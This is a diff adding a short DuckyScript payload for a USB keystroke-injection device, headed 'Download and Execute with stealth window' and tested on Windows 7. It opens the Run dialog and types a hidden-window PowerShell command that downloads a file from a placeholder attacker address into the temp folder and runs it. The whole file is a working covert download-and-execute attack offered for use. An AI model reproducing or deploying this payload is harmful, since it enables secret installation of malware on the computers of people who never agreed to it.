@@ -1,0 +1,11 @@
+REM ******************************************************
+REM Author:Federico Zambito
+REM Payload:Download and Execute with stealth window 
+REM Tested on: Windows 7
+REM ******************************************************
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -windowstyle hidden  (new-object System.Net.WebClient).DownloadFile('http://Your_IP_Address:port/test.old','%TEMP%\test.exe'); Start-Process "%TEMP%\test.exe"
+DELAY 200
+ENTER
